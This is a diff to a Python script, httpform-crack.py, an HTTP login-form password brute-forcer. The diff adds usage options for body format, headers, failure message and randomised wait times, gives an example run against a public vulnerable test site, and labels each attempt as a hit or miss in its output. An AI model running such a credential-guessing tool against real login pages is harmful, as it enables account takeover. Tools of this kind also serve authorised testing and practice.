@@ -2,7 +2,9 @@
 
 
 '''
-    usage: httpform-crack.py -u [url] -c [cookies] -U [users_file] -P [passwords_file]
+	Usage: ./httpform-crack.py -u [url] -c [cookies] -b [body_format] -H [headers_json] -U [users_file] -P [passwords_file] -e [error_message] -m [min_wait_time] -M [max_wait_time]
+	
+	Example: ./httpform-crack.py -u http://testphp.vulnweb.com/userinfo.php -U users.txt -P pass.txt -b "uname=^USER^&pass=^PASS^" -H {\"Content-Type\":\"application/x-www-form-urlencoded\"} -e "please enter your login information below" -m 0 -M 1
 '''
 
 
@@ -116,9 +118,9 @@ def main():
            )
            
            if ERROR_MSG not in response.text:
-              print(f"[{attempts}] \033[92mUser: {user} Password: {passwd} Status: {response.status_code}\033[0m")
+              print(f"[{attempts}] \033[92mACERTO User: {user} Password: {passwd} Status: {response.status_code}\033[0m")
            else:
-              print(f"[{attempts}] \033[91mUser: {user} Password: {passwd} Status: {response.status_code}\033[0m")
+              print(f"[{attempts}] \033[91mERRO User: {user} Password: {passwd} Status: {response.status_code}\033[0m")
 
            waitTime = random.uniform(MIN_WAIT, MAX_WAIT)
 
